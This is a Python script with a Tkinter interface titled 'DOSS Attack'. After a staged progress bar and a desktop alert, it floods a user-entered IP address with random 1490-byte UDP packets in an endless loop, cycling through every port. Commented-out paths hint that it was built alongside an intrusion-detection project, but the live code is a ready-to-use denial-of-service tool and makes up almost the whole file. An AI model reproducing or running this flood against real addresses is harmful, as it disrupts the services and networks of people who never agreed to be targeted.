from tkinter import *
from tkinter.filedialog import askdirectory
from tkinter import messagebox
from plyer import notification

import os
# Read Files 
import time
# Timing Loop
import socket

# Sending and reciving packets 
import random

#Random Bytes Send 

from datetime import datetime

import threading



def DOSS():

    window = Tk()
    window.title("DOSS Attack")

    window.geometry("1200x750")
    window.minsize("1200", "750")
    window.maxsize("1200", "750")

    
    winFrame = Frame(window, width="1200",height="750",bg="white")
    winFrame.pack()
    winFrame.pack_propagate(0)

    txtFrame = Frame(winFrame, width="1200",height="450",bg="white")
    txtFrame.pack()
    txtFrame.pack_propagate(0)

    # # Function to resize the window
    # def resize_image(e):
    #     global image, resized, image2
    #     # open image to resize it
    #     image = Image.open("D:\\Projects\\UI_v2\\attacks\\Background.png")
    #     # resize the image with width and height of root
    #     resized = image.resize((e.width, e.height), Image.ANTIALIAS)

    #     image2 = PhotoImage(resized, master=winFrame)
    #     bg_image = Label(
    #         winFrame,
    #         image=image2
    #     )
    #     bg_image.pack()

    # # Bind the function to configure the parent window
    # winFrame.bind("<Configure>", resize_image)

        
    # backgroundImage = PhotoImage(file="D:\\Projects\\UI_v2\\attacks\\Doss.png", master=winFrame)
    # bg_image = Label(
    #     window,
    #     image=backgroundImage
    # )
    # bg_image.pack()

    def ExitWindow():
        window.quit()

    window.protocol("WM_DELETE_WINDOW", ExitWindow)


    # text=Text(winFrame, width=80, height=15)
    # text.insert(END, "")
    # text.pack()

    # # create a Scrollbar and associate it with txt
    # scrollb = Scrollbar(winFrame, command=text.yview)
    # scrollb.grid(row=0, column=1, sticky='nsew')
    # text['yscrollcommand'] = scrollb.set

    # Add a Scrollbar(horizontal)
    v = Scrollbar(txtFrame, orient='vertical')
    v.pack(side=RIGHT, fill='y')

    # Add a text widget
    text = Text(txtFrame, width=80, height=10,font=("Georgia, 24"), yscrollcommand=v.set)
    text.insert(END, "")
    text.pack()
    # text=Text(win, font=("Georgia, 24"), yscrollcommand=v.set)

    # Add some text in the text widget
    # for i in range(10):
    #     text.insert(END, "Welcome to Tutorialspoint...\n\n")

    # Attach the scrollbar with the text widget
    v.config(command=text.yview)
    text.pack()


    btn1 = Button(winFrame, text="Start", width=16, height=3, command=lambda :threading.Thread(target=get_DOSS).start())
    btn1.place(x=470,y=420)

    # txtIP = Entry(winFrame, width=16, height=5,bg="white",cursor="hand2")
    # txtIP.insert(0, 'Enter Target IP')
    # txtIP.place(x=155, y=400)


    #heading label
    lblIP = Label(winFrame, text= "Target IP :" , font='Verdana 10 bold')
    lblIP.place(x=80,y=420)

    lblPort = Label(winFrame, text= "Port :" , font='Verdana 10 bold')
    lblPort.place(x=80,y=460)

    # Entry Box
    target_ip = StringVar()
    port_value = IntVar()
        
    ipentry = Entry(winFrame, width=40 , textvariable = target_ip)
    ipentry.focus()
    ipentry.place(x=200 , y=423)

    portentry = Entry(winFrame, width=40 ,textvariable = port_value)
    portentry.place(x=200 , y=460)


    def insert_text(txt):
        text.insert(END, txt+"\n")
        text.see(END)
    
    def get_DOSS():
        insert_text("DOSS Start ............")
        # Reading feature list  D:\\Projects\\Antivirus\\Antivirus_KDDCUP99
        # with open("D:\\Projects\\Antivirus\\Antivirus_KDDCUP99\\dataset\\kddcup.names",'r') as f:
        #     print(f.read())
        #     # insert_text(str(f.read()))
        #     text.insert("1.0", f.read())

        ##############
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Family and type parameter Family ( Internet Protocol v4 addresses ) 

        bytes = random._urandom(1490)
        #############

        # os.system("clear")
        # os.system("figlet DDos Attack")

        ip = ipentry.get()

        # Choose the ip 

        port = int(portentry.get())

        # Choose the port 

        # os.system("clear")
        # os.system("figlet Attack Starting")

        print("[                    ] 0% ")
        insert_text("[                    ] 0% ")
        time.sleep(5)
        print("[=====               ] 25%")
        insert_text("[=====               ] 25%")
        time.sleep(5)
        print("[==========          ] 50%")
        insert_text("[==========          ] 50%")
        time.sleep(5)
        print("[===============     ] 75%")
        insert_text("[===============     ] 75%")
        time.sleep(5)
        print("[====================] 100%")
        insert_text("[====================] 100%")
        time.sleep(3)
        # openfile = open("4.mp4", "rb")
        # bytes = openfile.read()
        notification.notify(
                title = "Your Device is being attacked",
                message="DOSS Attack Detected" ,
            
                # displaying time
                timeout=4
            )
            # waiting time
        time.sleep(3)

        sent = 0

        while True:
            
            sock.sendto(bytes, (ip,port))

            # Send The Bytes to This Ip and port 



            #  print(bytes)
            #  openfile.close()
            sent = sent + 1
            port = port + 1
            print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
            insert_text("test")
            insert_text("Sent "+ str(sent) +" packet to "+ ip +" throught port: " + str(port))


            


            if port == 65534:
                # Total Number Of Ports 
                port = 1




    window.mainloop()
